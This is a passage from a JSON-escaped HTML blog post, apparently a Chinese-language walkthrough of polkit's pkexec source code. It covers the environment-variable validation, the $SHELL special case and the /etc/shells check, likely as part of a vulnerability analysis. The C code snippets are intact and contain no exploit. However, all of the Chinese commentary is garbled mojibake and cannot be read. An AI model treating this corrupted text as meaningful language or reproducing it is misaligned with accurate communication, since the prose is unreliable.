idxï¼Œå¯ä»¥å¾—çŸ¥è¿™æ˜¯ä¸ªæ•°ç»„<br>\nåé¦ˆåˆ°æºç </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shells = g_strsplit (contents, <span class=\"string\">&quot;\\n&quot;</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">for</span> (n = <span class=\"number\">0</span>; shells != <span class=\"literal\">NULL</span> &amp;&amp; shells[n] != <span class=\"literal\">NULL</span>; n++)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (g_strcmp0 (shell, shells[n]) == <span class=\"number\">0</span>)</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        ret = TRUE;</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>åœ¨åé¢è°ƒç”¨äº†</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">      <span class=\"comment\">/* To qualify for the paranoia goldstar - we validate the value of each</span></span><br><span class=\"line\"><span class=\"comment\">       * environment variable passed through - this is to attempt to avoid</span></span><br><span class=\"line\"><span class=\"comment\">       * exploits in (potentially broken) programs launched via pkexec(1).</span></span><br><span class=\"line\"><span class=\"comment\">       */</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!validate_environment_variable (key, value))</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\"></span><br><span class=\"line\">ç„¶åé‡Œé¢åˆè°ƒç”¨äº†---------------------------------------------------</span><br><span class=\"line\">  <span class=\"comment\">/* special case $SHELL */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (g_strcmp0 (key, <span class=\"string\">&quot;SHELL&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"comment\">/* check if it&#x27;s in /etc/shells */</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!is_valid_shell (value))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          log_message (LOG_CRIT, TRUE,</span><br><span class=\"line\">                       <span class=\"string\">&quot;The value for the SHELL variable was not found in the /etc/shells file&quot;</span>);</span><br><span class=\"line\">          g_printerr (<span class=\"string\">&quot;\\n&quot;</span></span><br><span class=\"line\">                      <span class=\"string\">&quot;This incident has been reported.\\n&quot;</span>);</span><br><span class=\"line\">          <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">-----------------------------------------------------------------------</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (n = <span class=\"number\">0</span>; shells != <span class=\"literal\">NULL</span> &amp;&amp; shells[n] != <span class=\"literal\">NULL</span>; n++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (g_strcmp0 (shell, shells[n]) == <span class=\"number\">0</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          ret = TRUE;</span><br><span class=\"line\">          <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"> out:</span><br><span class=\"line\">  g_free (contents);</span><br><span class=\"line\">  g_strfreev (shells);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "Linux",
                "User state"
            ]
        }
    ]
}